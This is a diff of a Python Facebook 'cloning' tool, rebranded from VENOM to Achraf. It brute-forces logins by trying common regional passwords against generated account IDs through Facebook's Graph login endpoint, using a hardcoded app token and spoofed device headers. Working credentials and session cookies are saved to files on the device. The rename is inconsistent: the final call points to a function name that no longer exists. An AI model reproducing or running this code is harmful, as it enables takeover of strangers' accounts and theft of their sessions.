@@ -1,4 +1,4 @@
-# Open Source By SYED-ZADA
+#Open Source By SYED-ZADA
 
 samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 
@@ -16,7 +16,7 @@ try:
     from concurrent.futures import ThreadPoolExecutor as tred
 except ImportError:
     os.system('pip install requests futures==2 > /dev/null')
-    os.system('python VENOM.py')
+    os.system('python Achraf.py')
 
 try:
     g = "anar"
@@ -99,7 +99,7 @@ def p(x):
 
 xxxx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748125;FBDM/"+"{density=1.0,width=600,height=976};FBLC/"+"es_LA;FBCR/"+"MOVISTAR;FBMF/"+"Rockchip;FBBD/"+"K5-3G;FBPN/"+"com.facebook.katana;FBDV/"+"K5-3G;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"
 #ua = "[FBAN/FB4A;FBAV/107.26.45.69;FBBV/61714298;FBDM/{density=2.5,width=859,height=2059};FBLC/en_GB;FBRV/11130038;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/5.8;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/135.62.83.5;FBBV/51324647;FBDM/{density=1.1,width=832,height=2554};FBLC/en_GB;FBRV/24264444;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/9.7;FBOP/1;FBCA/arm64-v8a:;]"
-folder_path = '/sdcard/VENOM'
+folder_path = '/sdcard/Achraf'
 try:
     os.makedirs(folder_path, exist_ok=True)
 except:
@@ -109,12 +109,20 @@ oks=[]
 cps=[]
 loop=0
 logo=(f"""\033[1;37m
- db    db d88888b d8b   db  .d88b.  .88b  d88. 
- 88    88 88'     888o  88 .8P  Y8. 88'YbdP`88 
-\033[1;32m Y8    8P 88ooooo 88V8o 88 88    88 88  88  88 
-\033[1;32m `8b  d8' 88~~~~~ 88 V8o88 88    88 88  88  88 
-\033[1;37m  `8bd8'  88.     88  V888 `8b  d8' 88  88  88 
-    YP    Y88888P VP   V8P  `Y88P'  YP  YP  YP  
+    _____                     _  
+  / ____|                   | | 
+ | (___  _ __   ___  ___  __| | 
+  \___ \| '_ \ / _ \/ _ \/ _` | 
+  ____) | |_) |  __/  __/ (_| | 
+ |_____/| .__/ \___|\___|\__,_| 
+        | |                     
+        |_|                     
+
+ 
+\033[1;32m 
+\033[1;32m 
+\033[1;37m  
+    
 ════════════════════════════════════════════════
 \033[1;32m  • \033[1;37m Tool Owner :-  Usman X achraf 
 \033[1;32m  • \033[1;37m GitHub     :-  Love -786
@@ -136,7 +144,7 @@ def line():print(48*'\033[1;37m═')
  
 ###########______###########
 
-def Main_VENOM():
+def Main_Achraf():
         clear()
         print(" [\033[1;32m1\033[97;1m] FILE CLONING")
         print(" [\033[1;32m2\033[97;1m] RANDOM CLONING")
@@ -262,7 +270,7 @@ def pak():
                                 passlist = [psx,ids,'khankhan123','57273200','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','khan1122','khan12','i love you','iloveyou','janjan']
  
                                 VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python Achraf.py')
 
 def afg():
                 user=[]
@@ -285,13 +293,13 @@ def afg():
                 with tred(max_workers=30) as VENOM:     
                         clear()
                         tl = str(len(user))
-                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/Achraf');line()
                         for psx in user:
  
                                 ids = code+psx
                                 passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                 VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/Achraf/Achraf-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/Achraf/Achraf-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python Achraf.py')
 
 def bd():
                 user=[]
@@ -314,12 +322,12 @@ def bd():
                 with tred(max_workers=30) as VENOM:     
                         clear()
                         tl = str(len(user))
-                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/Achraf');line()
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','janjan','free fire','freefire','57273200']
                                 VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/Achraf/Achraf-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/Achraf/Achraf-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python Achraf.py')
 
  
 
@@ -357,7 +365,7 @@ def gmail():
                         total = str(len(fo))
  
                         clear()
-                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+total);print('\033[1;32m (√) \033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+total);print('\033[1;32m (√) \033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/Achraf');line()
                         for user in fo:
                                 ids,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
@@ -371,13 +379,13 @@ def gmail():
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
  
                                 VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/Achraf/Achraf-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/Achraf/Achraf-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python Achraf.py')
 
 
 def rd1(ids,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write('\r\r\33[1;37m [\33[1;32mVENOM-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\33[1;37m [\33[1;32mAchraf-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         for pas in passlist:
                 accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
@@ -396,7 +404,7 @@ def rd1(ids,passlist):
                 xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/Hwawie;"+"FBBD/Opppo;"+"FBPN/com.facebook.katana;"+"FBDV/Samsong 17974;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:arfuck-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/relmeo;"+"FBBD/technO;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
                 #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
                 ua  = "[[FBAN/FB4A;FBAV/388.0.0.32.105;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/317616396;FBCR/O2 Prepaid;FBMF/Sony;FBBD/sony;FBDV/E2303;FBSV/13.5.1;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=1.0,width=1053,height=1923};]"+"[FBAN/FB4A;FBAV/373.0.0.31.112;FBBV/314614855;FBDM/{density=2.0,width=700,height=1091};FBLC/en_GB;FBRV/314987887;FB_FW/2;FBCR/Serenity Mobile;FBMF/Asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/AI2201;FBSV/15.9.5;FBOP/19;FBCA/x86_64:x86:arm64-v8a;]"
-                head = {'User-Agent':VENOM_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+                head = {'User-Agent':Achraf_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                 data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                 po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
                 if 'session_key' in po:
@@ -404,10 +412,10 @@ def rd1(ids,passlist):
                         ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                         ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                         cookie = f"sb={ssbb};{ckkk}"
-                        print('\r\r\033[1;32m [VENOM-OK] '+uid+' √ '+pas)
+                        print('\r\r\033[1;32m [Achraf-OK] '+uid+' √ '+pas)
                         print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
-                        file_path_ok = os.path.join(folder_path, 'VENOM-R-OK.txt')
-                        file_path_cookies = os.path.join(folder_path, 'VENOM-R-COOKIE.txt')
+                        file_path_ok = os.path.join(folder_path, 'Achraf-R-OK.txt')
+                        file_path_cookies = os.path.join(folder_path, 'Achraf-R-COOKIE.txt')
                         with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
                             file_ok.write(uid+' √ '+pas+'\n')
                             file_cookies.write(uid+' √ '+pas+' >>> '+cookie+'\n')
@@ -416,7 +424,7 @@ def rd1(ids,passlist):
                 elif 'www.facebook.com' in po['error']['message']:
                         uid = str(po['error']['error_data']['uid'])
                         #print(f'\r\r\33[1m\33[1;35m [CP] '+uid+' | '+pas+'\033[1;97m')
-                        file_path = os.path.join(folder_path, 'VENOM-R-CP.txt')
+                        file_path = os.path.join(folder_path, '-R-CP.txt')
                         with open(file_path, 'a') as file:
                             file.write(uid+' √ '+pas+'\n')
                         cps.append(uid)
@@ -432,7 +440,7 @@ def rd1(ids,passlist):
 def api1(ids,names,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write('\r\r\33[1;37m [\33[1;32mVENOM-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\33[1;37m [\33[1;32m-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -464,11 +472,11 @@ def api1(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print('\r\r\033[1;32m [VENOM-OK] '+uid+' √ '+pas)
+                    print('\r\r\033[1;32m [Achraf-OK] '+uid+' √ '+pas)
                     print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
-                    file_path = os.path.join(folder_path, 'VENOM-FILE-OK.txt')
+                    file_path = os.path.join(folder_path, 'Achraf-FILE-OK.txt')
                     #session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                    open('/sdcard/VENOM/VENOM-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
+                    open('/sdcard/VENOM/Achraf-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+' √ '+pas+'\n')
                     oks.append(uid)
@@ -476,7 +484,7 @@ def api1(ids,names,passlist):
             elif 'www.facebook.com' in po['error']['message']:
                     uid = str(po['error']['error_data']['uid'])
                     #print(f'\r\r\33[1m\33[1;35m [MOOSA-CP] '+uid+' | '+pas+'\033[1;97m')
-                    file_path = os.path.join(folder_path, 'VENOM-FILE-CP.txt')
+                    file_path = os.path.join(folder_path, 'Achraf-FILE-CP.txt')
                     with open(file_path, 'a') as file:
                         file.write(uid+' √ '+pas+'\n')
                     cps.append(uid)
@@ -489,7 +497,7 @@ def api1(ids,names,passlist):
     except Exception as e:
         pass
 
-try:MainAchraf()
+try:Main_VENOM()
 except requests.exceptions.ConnectionError:
     print('\n\033[1;92m [×] \033[1;91mNo internet connection ...')
 except Exception as e:pass
